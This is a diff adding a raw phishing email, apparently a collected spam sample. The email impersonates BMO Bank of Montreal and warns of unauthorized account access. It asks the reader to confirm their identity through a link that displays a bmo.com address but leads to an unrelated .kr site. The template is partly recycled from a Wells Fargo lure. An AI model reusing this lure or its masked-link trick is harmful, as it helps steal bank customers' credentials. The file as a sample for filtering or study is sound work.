@@ -1,0 +1,80 @@
+Delivered-To: em-ca-bruceg@em.ca
+Received: (qmail 31355 invoked from network); 21 Jan 2014 13:32:31 -0000
+Received: from Xplicit.xplicitweb.local (www.reejeel.com [81.95.115.33])
+  by churchill.factcomp.com ([24.89.90.248])
+  with ESMTP via TCP; 21 Jan 2014 13:32:31 -0000
+Received: from apache by Xplicit.xplicitweb.local with local (Exim 4.73)
+	(envelope-from <bonc0001@bonc.be>)
+	id 1W5bI7-00069U-30
+	for bruceg@em.ca; Tue, 21 Jan 2014 14:22:55 +0100
+To: bruceg@em.ca
+Subject: Important Notice
+X-PHP-Originating-Script: 1001:mail.php
+From: BMO Bank of Montreal <onlinebanking@bmo.com>
+Reply-To: 
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1W5bI7-00069U-30@Xplicit.xplicitweb.local>
+Date: Tue, 21 Jan 2014 14:22:55 +0100
+
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>Wells Fargo .::New Wells From Cali::.</title>
+<style type="text/css" media="all">
+<!--
+/* This Letter is not for sale*/
+body { 
+	font-family:Verdana, Arial, Helvetica, sans-serif;
+	font-size:12px;
+}
+
+hr {
+	color:#FF0000;
+}
+.style1 {	
+	font-family: Verdana, Arial, Helvetica, sans-serif;
+	font-size: 12px;
+}
+.style2 {
+	font-family:Verdana, Arial, Helvetica, sans-serif;
+	font-size:10px;
+	color:#7A7A7A;
+}
+.style3 {
+	color:#CCCCCC;
+	font-weight: lighter;
+}
+.style4 {
+	color:#999999;
+	font-weight:bolder;	
+}	
+-->	
+</style>	
+</head>
+
+<body>
+<p><img src="http://www.bmo.com//images/logo_bmofg.gif" width="202" height="70" /> 
+<p>Dear Customer,
+<hr />
+<p class="style1">We recently reviewed your account, and suspect that your BMO Online Banking account might have been accessed by an unauthorized third party.
+<p>Protecting the security of your account is our primary concern, therefore as a preventive measure, we have temporarily limited access to sensitive account features.
+<p>To restore your account access, we need you to confirm your identity.
+<p>Please follow the link below to proceed to confirming your account information:<br>
+<a rel="nofollow" target="_blank" href="http://newpetap.aplayer.co.kr/data/category/bmadministrator/index.htm"><span class="yshortcuts" id="lw_1286145418_2">https://www1.bmo.com/cgi-bin/netbnx/NBmain?ver=1sessargs=8WiAT-tsM5PMX8vgoSt9YoyidHmkqZJJ</span></a>.
+<hr />
+<p class="style3">If you are concerned about the authenticity of this message, please <a rel="nofollow" target="_blank" href="http://www.bmo.com/home/popups/global/security?pChannelId=74876"><span class="yshortcuts" id="lw_1286145418_4">click here</span></a> or call the phone number on the back of your credit card.<Br> If you would like to learn more about e-mail security or want to report a suspicious e-mail, <a rel="nofollow" target="_blank" href="http://www.bmo.com/home/popups/global/privacy?pChannelId=74876">click here</a>.</p>
+<p class="style4>"Important FDIC insurance updates: Beginning January 1, 2010, BMO will no longer participate in the FDIC's Transaction Account Guarantee Program.</p>
+<p class="style2">© 1999 - 2014 BMO Bank of Montreal. All rights reserved. Equal Housing Lender<img src="https://a248.e.akamai.net/f/248/1856/90m/www.wellsfargo.com/img/hp/al_ehl_house_gen.gif" /></p>
+
+
+</body>
+</html>
+
+
+</body>
+</html>
+
+
